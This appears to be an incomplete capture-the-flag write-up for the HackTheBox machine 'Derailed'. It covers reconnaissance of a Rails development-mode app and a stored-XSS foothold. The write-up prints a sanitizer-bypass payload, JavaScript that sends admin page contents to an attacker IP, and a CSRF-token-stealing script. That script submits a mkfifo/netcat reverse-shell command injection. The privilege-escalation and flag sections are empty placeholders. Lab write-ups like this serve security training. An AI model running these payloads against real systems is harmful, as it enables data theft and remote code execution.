# HackTheBox — Derailed

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Insane](https://img.shields.io/badge/Difficulty-Insane-purple)
![Tags: rails, xss, csrf, command-injection](https://img.shields.io/badge/Tags-Rails%20%7C%20XSS%20%7C%20CSRF%20%7C%20Command%20Injection-orange)

> 🚧 **[heavily incomplete — original notes contain recon, route enumeration, and two XSS payloads (charCode-encoded), but no further narrative]**

---

## Attack Chain at a Glance

```
nmap → 3000/tcp Rails 6.1.6 (Ruby 2.7.2, dev mode)
   → /rails/info/routes leaks the entire route table
   → notable routes: /clipnotes (notes create/show), /administration, POST /administration/reports
   → XSS in note rendering (likely via raw#show route)
   → first-stage XSS: exfil /administration page contents
   → second-stage XSS: parse authenticity_token, POST a forged report_log
     containing command injection → reverse shell as RoR app user
   → 🚧 [user]
   → 🚧 [privesc]
   → 🚧 [root]
```

> 🚧 **[note]** A second file `derailed-oscp.md` exists in the original notes directory but is the **OSCP exam report template**, not an actual writeup of this box. It can be ignored.

---

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sSCV -p- --min-rate=5000 -oN nmap.txt 10.129.228.107
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1
3000/tcp open  http    nginx 1.18.0
|_http-title: derailed.htb
|_http-server-header: nginx/1.18.0
```

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH     | OpenSSH 8.4p1 |
| 3000 | HTTP    | nginx 1.18.0 — Rails app on the standard Rails dev port |

### Directory Enumeration

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/ror.txt \
             -u http://derailed.htb:3000/ \
             --proxy http://127.0.0.1:8080
```

```
/assets/application.css   (200) [Size: 1165]
/rails/info               (302) → /rails/info/routes
/rails/info/properties    (200) [Size: 2294]
```

### Application Properties (`/rails/info/properties`)

```
Rails version            6.1.6
Ruby version             ruby 2.7.2p137
RubyGems version         3.1.4
Rack version             2.2.3
Application root         /var/www/rails-app
Environment              development           ← production secrets, dev-mode debugger
Database adapter         sqlite3
```

> 💡 **`Environment: development`** on a Rails 6.1.6 box exposes the entire `/rails/info/*` info system *and* a verbose error page that leaks source. It also routinely means tighter-than-prod CSP is *not* enforced.

### Application Routes (`/rails/info/routes`)

The interesting route surface (full list in the original notes; truncated here for clarity):

| Verb   | Path                          | Controller#Action            |
|--------|-------------------------------|------------------------------|
| GET    | `/raw/show`                   | `raw#show`                   |
| GET    | `/clipnotes`                  | `notes#index`                |
| POST   | `/clipnotes`                  | `notes#create`               |
| GET    | `/clipnotes/:id`              | `notes#show`                 |
| GET    | `/clipnotes/raw/:id`          | `raw#show`                   |
| GET    | `/administration`             | `admin#index`                |
| POST   | `/administration/reports`     | `admin#create`               |
| GET    | `/report/:id`                 | `report#index`               |
| POST   | `/report`                     | `report#create`              |
| GET    | `/login`                      | `sessions#new`               |
| POST   | `/login`                      | `sessions#create`            |
| GET    | `/register`                   | `applicants#new`             |
| POST   | `/register`                   | `applicants#create`          |

The presence of both `notes#show` (rendered HTML) and `raw#show` (raw display) strongly suggests note content is rendered in two contexts — one of them likely without escaping.

The split between user-facing `/clipnotes` and admin-only `/administration/reports` indicates the foothold path is **stored XSS in clipnotes → reflected/triggered when an admin views the note → CSRF-style action against `/administration/reports`**.

---

## Initial Foothold — Stored XSS → Admin CSRF

### Stage 1 — Exfiltrating the Administration Page

The first XSS payload (preserved from original notes, decoded from `String.fromCharCode(...)`):

```html
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/>
<img src='http://10.10.14.153/imgfail' onerror="...">
```

The `eval(String.fromCharCode(...))` body unwraps to:

```javascript
var url      = "http://derailed.htb:3000/administration";
var attacker = "http://10.10.14.153/exfil";
var xhr      = new XMLHttpRequest();

xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)));
    }
};

xhr.open('GET', url, true);
xhr.send(null);
```

Effect: when an admin loads the malicious note, their browser fetches `/administration` and beacons the base64-encoded HTML to our listener. We can extract the `authenticity_token` from that capture.

> 💡 **The `<select<style/>` HTML-mangling trick** breaks Rails' / Rack-Sanitize's HTML scrubber. Modern Rails uses Loofah; certain malformed-but-still-parseable tag soups slip past its allow-list because the parser and the scrubber disagree on what constitutes a valid element.

### Stage 2 — Forging the Reports Submission

The second XSS payload (also charCode-encoded):

```javascript
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", "http://derailed.htb:3000/administration", true);
xmlHttp.send(null);

setTimeout(function() {
    var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html');
    var token = doc.getElementById('authenticity_token').value;

    var newForm = new DOMParser().parseFromString(
        '<form id="badform" method="post" action="/administration/reports">' +
        '  <input type="hidden" name="authenticity_token" id="authenticity_token" value="placeholder" autocomplete="off">' +
        '  <input id="report_log" type="text" class="form-control" name="report_log" value="placeholder" hidden="">' +
        '  <button name="button" type="submit">Submit</button>',
        'text/html');

    document.body.append(newForm.forms.badform);
    document.getElementById('badform').elements.report_log.value =
        '|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.153 1234 >/tmp/f';
    document.getElementById('badform').elements.authenticity_token.value = token;
    document.getElementById('badform').submit();
}, 3000);
```

Sequence:
1. Fetch `/administration` to get the admin's `authenticity_token` (Rails CSRF token).
2. Build a form whose `report_log` field contains a netcat reverse-shell payload prefixed with `|`.
3. POST it to `/administration/reports` with the captured token.

The leading pipe (`|`) in `report_log` indicates the back-end builds a shell command that incorporates the field — likely something like:

```ruby
system("some_log_processor #{report_log}")    # or
`some_log_processor #{report_log}`
```

Either is a textbook command-injection sink: `|...nc...` breaks out and runs our payload.

### Listener

```bash
nc -lvnp 1234
```

Catch the shell when an admin views the malicious clipnote.

> 🚧 **[gap]** — original notes don't document the user the shell lands as, the user-flag location, or how the chain proceeds from there.

---

## User Flag

> 🚧 **[incomplete]**

---

## Privilege Escalation

> 🚧 **[incomplete]**

---

## Root Flag

> 🚧 **[incomplete]**

---

## Lessons Learned

> 🚧 **[incomplete]**. Candidate themes from the partial chain:
> - **Rails routes are public when `/rails/info` is reachable** — and dev-mode boxes routinely leave it on. The full route table tells you where every controller lives without needing to enumerate.
> - **HTML scrubbers and HTML parsers don't always agree.** Tag-soup payloads (`<select<style/>` etc.) are an ongoing arms race; pasting one fresh from a writeup is faster than re-deriving the bypass.
> - **CSRF tokens don't help when the attacker can read them via XSS.** A two-stage payload (read-then-replay) defeats the framework-level protection cleanly.
> - **`|cmd` in a logged field is the classic Rails command-injection shape**, especially in admin "report" or "scan" routes that shell out.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Port discovery |
| [`gobuster`](https://github.com/OJ/gobuster) | Directory enumeration with the Rails wordlist |
| [Burp Suite](https://portswigger.net/burp) | Proxy / repeater for crafting payloads |
